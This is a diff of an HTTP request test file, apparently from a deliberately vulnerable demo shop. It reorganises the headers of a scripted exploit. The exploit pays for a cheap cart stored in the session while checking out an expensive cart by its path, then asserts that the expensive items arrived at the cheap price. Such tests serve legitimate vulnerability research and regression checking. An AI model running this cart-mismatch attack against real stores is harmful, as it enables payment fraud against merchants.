@@ -12,8 +12,11 @@
 # 3. Creating a cheap cart (stored in session)
 # 4. Checking out the EXPENSIVE cart via path, but paying for CHEAP session cart
 
+# =============================================================================
+# SETUP: Get menu item prices
+# =============================================================================
 
-### Step 1: Get menu items for price reference
+### Get menu items for price reference
 # @name seed
 {{
   await platform.seed({
@@ -27,7 +30,11 @@ GET /menu
 @ultimate_feast_id = {{$(response).find(i => i.name === "Ultimate Krabby Feast").id}}
 @ultimate_feast_price = {{$(response).find(i => i.name === "Ultimate Krabby Feast").price}}
 
-### Step 2: Create EXPENSIVE cart without session (Basic Auth only)
+# =============================================================================
+# STEP 1: Create EXPENSIVE cart (no session - Basic Auth only)
+# =============================================================================
+
+### Create expensive cart without session
 # @name expensive_cart
 # @forceRef seed
 POST /cart?restaurant_id=1
@@ -36,7 +43,7 @@ Authorization: {{auth.basic("plankton")}}
 @expensive_cart_id = {{$(response).field("cart_id")}}
 ?? js $(response).status() == 201
 
-### Step 3: Add expensive item to expensive cart
+### Add expensive item to expensive cart
 # @name expensive_cart_with_item
 # @forceRef expensive_cart
 POST /cart/{{expensive_cart_id}}/items
@@ -47,7 +54,11 @@ Content-Type: application/json
 
 ?? js $(response).isOk() == true
 
-### Step 4: Create CHEAP cart
+# =============================================================================
+# STEP 2: Create CHEAP cart (with session)
+# =============================================================================
+
+### Login and create cheap cart (stored in session)
 # @name cheap_cart
 # @forceRef expensive_cart_with_item
 {{
@@ -56,12 +67,11 @@ Content-Type: application/json
 POST /cart?restaurant_id=1
 Cookie: {{session}}
 
-// Store the updated session cookie!
 @session = {{extractCookie(response)}}
 @cheap_cart_id = {{$(response).field("cart_id")}}
 ?? js $(response).status() == 201
 
-### Step 7: Add cheap item to cheap cart
+### Add cheap item to cheap cart
 # @name cheap_cart_with_item
 # @forceRef cheap_cart
 POST /cart/{{cheap_cart_id}}/items
@@ -72,12 +82,15 @@ Content-Type: application/json
 
 ?? js $(response).isOk() == true
 
-### Step 8: EXPLOIT - Checkout EXPENSIVE cart path with CHEAP session cart
-# Session has cheap_cart_id, but path points to expensive_cart_id
+# =============================================================================
+# EXPLOIT: Checkout EXPENSIVE cart path with CHEAP session cart
+# =============================================================================
+
+### EXPLOIT - Path says expensive cart, session has cheap cart
 # charge_customer_with_hold charges for session cart (cheap)
 # but checkout_cart creates order from path cart (expensive)
-# @forceRef cheap_cart_with_item
 # @name exploit_checkout
+# @forceRef cheap_cart_with_item
 POST /cart/{{expensive_cart_id}}/checkout
 Cookie: {{session}}
 Content-Type: application/json
@@ -87,23 +100,23 @@ Content-Type: application/json
 @order_id = {{$(response).field("order_id")}}
 ?? js $(response).status() == 201
 
-### Step 9: Verify we received the EXPENSIVE items
+# =============================================================================
+# VERIFICATION: Got expensive items, paid cheap price
+# =============================================================================
+
+### Received EXPENSIVE items (Ultimate Krabby Feast)
 # @forceRef exploit_checkout
 # @tag ci, r03, vulnerable
 GET /orders
 Cookie: {{session}}
-
-{{
-  console.info($(response).last());
-}}
 
 ?? js $(response).last().order_id == {{order_id}}
 ?? js $(response).last().items.length == 1
 ?? js $(response).last().items[0].item_id == {{ultimate_feast_id}}
 ?? js $(response).last().items[0].name == Ultimate Krabby Feast
 
-### Step 10: Verify we were only charged for the CHEAP items!
-# @forceRef exploit_checkout
+### Only charged for CHEAP items (Krabby Patty + tip)
+# @ref exploit_checkout
 # @tag ci, r03, vulnerable
 GET /account/info
 Cookie: {{session}}
